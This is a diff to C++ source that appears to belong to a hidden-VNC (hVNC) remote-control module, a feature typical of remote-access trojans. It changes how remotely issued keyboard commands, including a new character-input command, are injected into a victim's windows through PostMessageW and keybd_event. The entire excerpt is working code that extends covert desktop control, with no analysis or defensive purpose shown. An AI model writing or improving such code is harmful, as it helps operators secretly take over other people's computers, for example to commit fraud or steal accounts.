@@ -923,31 +923,25 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
-        if (action == "hvnc_keydown" || action == "hvnc_keyup") {
+        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
             HWND hTarget = target_window_from_screen_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
-            bool isKeyUp = (action == "hvnc_keyup");
-            UINT msg = isKeyUp ? WM_KEYUP : WM_KEYDOWN;
+            if (action == "hvnc_char") {
+                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+            } else {
+                bool isKeyUp = (action == "hvnc_keyup");
+                UINT msg = isKeyUp ? WM_KEYUP : WM_KEYDOWN;
 
-            DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
-            DWORD currentThreadId = GetCurrentThreadId();
-
-            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
-
-            if (vk == 0x14 && !isKeyUp) { // VK_CAPITAL down
-                BYTE keyState[256];
-                if (GetKeyboardState(keyState)) {
-                    keyState[0x14] ^= 1;
-                    SetKeyboardState(keyState);
+                // Sync global state for toggle/modifier keys
+                if (vk == 0x14 || vk == 0x10 || vk == 0x11 || vk == 0x12) {
+                    keybd_event((BYTE)vk, 0, isKeyUp ? KEYEVENTF_KEYUP : 0, 0);
                 }
+
+                PostMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, isKeyUp));
             }
-
-            SendMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, isKeyUp));
-
-            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
 
             g_forceFullFrame = true;
             continue;
